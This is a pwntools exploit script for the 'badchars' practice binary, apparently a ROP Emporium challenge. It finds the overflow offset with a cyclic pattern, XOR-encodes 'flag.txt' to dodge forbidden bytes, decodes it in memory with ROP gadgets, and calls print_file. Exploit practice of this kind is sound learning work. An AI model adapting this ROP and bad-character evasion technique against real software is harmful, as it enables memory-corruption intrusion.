#!/usr/bin/python3
from pwn import *

def start():
	binary_path = "./badchars"
	p = process(binary_path)
	gdb.attach(p, gdbscript = '''
		b main
		continue
	''')
	return p

elf = context.binary = ELF("./badchars")
context.log_level = "info"
context.delete_corefiles = True

# its strange tha if i dont add 8 for data_section, it wont output right ans
data_section = elf.symbols.data_start + 8
info("data_section = %#x", data_section) 

rop = ROP(elf)
mov_r13_r12 = elf.symbols.usefulGadgets + 12
xor_r15_r14 = elf.symbols.usefulGadgets 
pop_r14_r15 = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]
pop_r12_r13_r14_r15 = rop.find_gadget(["pop r12", "pop r13", "pop r14", "pop r15", "ret"])[0]

info("mov_r13_r12 = %#x", mov_r13_r12)
info("xor_r15_r14 = %#x", xor_r15_r14)
info("pop_r14_r15 = %#x", pop_r14_r15)
info("pop_r12_r13_r14_r15 = %#x", pop_r12_r13_r14_r15)


xor_val = 2
xored_flag = xor("flag.txt", xor_val)
info("xored_flag = %s", xored_flag)

rop.raw([pop_r12_r13_r14_r15, xored_flag, data_section, 0, 0, mov_r13_r12])

xor_rev = b''
xor_offset = 0

for i in xored_flag:
	xor_rev += pack(pop_r14_r15)
	xor_rev += pack(xor_val)
	xor_rev += pack(data_section + xor_offset)
	xor_rev += pack(xor_r15_r14)
	xor_offset += 1

rop.raw(xor_rev)

rop.print_file(data_section)

rop_chain = rop.chain()

io = start()
payload = cyclic(100, alphabet = "bcdefhijkl")
io.sendlineafter(">", payload)
io.wait()
core = io.corefile

rsp = core.rsp
pattern = core.read(rsp, 4)
rip_offset = cyclic_find(pattern, alphabet = "bcdefhijkl")



io = start()
payload = flat({
	rip_offset: rop_chain

})
io.sendlineafter(">", payload)

while True:
	tmp = io.recv()
	info(tmp)




